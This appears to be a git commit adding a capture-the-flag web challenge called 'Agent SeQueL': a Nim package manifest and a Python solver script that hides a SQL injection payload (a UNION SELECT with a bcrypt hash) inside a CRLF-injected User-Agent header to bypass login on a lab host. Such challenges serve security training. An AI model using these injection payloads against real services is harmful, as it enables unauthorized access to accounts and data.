20ab01da11338bc9960131c3f08db2a9bde7cccb
Ammar Farhan Mohamad Rizam <ammar_22006911@utp.edu.my>
2024-02-16 03:58:53 +0800

    Add Agent SeQueL challenge

---
+++ web/agent-sequel/challenge/control_api/control_api.nimble
@@ -0,0 +1,13 @@
+# Package
+
+version       = "0.1.0"
+author        = "lean & FROST8ytes"
+description   = "The control api"
+license       = "MIT"
+srcDir        = "src"
+bin           = @["main"]
+
+# Dependencies
+
+requires "nim >= 1.2.4"
+requires "jester"
---
+++ web/agent-sequel/solution/solver.py
@@ -0,0 +1,27 @@
+import requests, requests_raw, json
+
+HOST, PORT = "172.16.82.0", 1030
+CHALLENGE_URL = f"http://{HOST}:{PORT}"
+
+
+def pwn():
+    with requests.Session() as session:
+        dummy_payload = """{"username":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","password":"aaaa"}"""
+        sqli_payload = """{"username":"' UNION SELECT 1, 'test', '$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq","password"test:""}"""
+
+        resp = session.post(
+            f"{CHALLENGE_URL}/user",
+            data=eval(dummy_payload),
+            headers={"User-Agent": f"ChromeBot/9.5%0D%0A%0D%0A{sqli_payload}"},
+        )
+
+        return resp.text
+
+
+def main():
+    flag = pwn()
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
